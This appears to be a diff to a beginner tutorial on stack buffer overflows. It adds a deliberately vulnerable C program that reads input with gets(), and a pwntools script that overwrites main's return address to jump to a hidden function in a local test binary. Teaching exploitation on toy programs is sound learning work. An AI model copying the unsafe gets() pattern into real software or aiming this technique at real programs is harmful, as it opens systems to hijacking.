@@ -28,8 +28,37 @@ This is known as [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow
 
 Well, let's take a look at this program:  
 ```c
+#include <stdio.h>
 
+int canttouchthis(){
+	printf("You shouldn't be here\n");
+}
+
+int main()
+{       
+	int myVar = 1337;
+	char myCharVar[10];
+	gets(myCharVar);
+	printf("good job\n");
+}
 ```
 
+Again, we can cause a segmentation fault:  
+![image](https://user-images.githubusercontent.com/65077960/127716435-5fc36553-62bf-4141-a04b-3e2a0c9dab79.png)
 
+But the interesting part, the flag, is out of our scope. How do exploit it? We'll need to start by performing some recon. I'll use radare2 but you can use any debugger. We need the address of the "canttouchthis" function, so we can overwrite the "ret" instruction at the end of main().  
 
+![image](https://user-images.githubusercontent.com/65077960/127717983-9c0d9f4e-fe64-4765-a89c-9f886e8de39b.png)
+
+We'll make a small python script to exploit this:
+```py
+from pwn import *
+
+p = process("./pwnme")
+# Use a pattern to verify changes after overflow, p64 after as it's little endian.
+buf = b"aaaaaaaabbbbbbbbcccccc" + p64(<addr>)
+# overwriting the return address with the "canttouchthis" function address
+p.sendline(buf)
+print(p.recvline())
+print(p.recvline())
+```
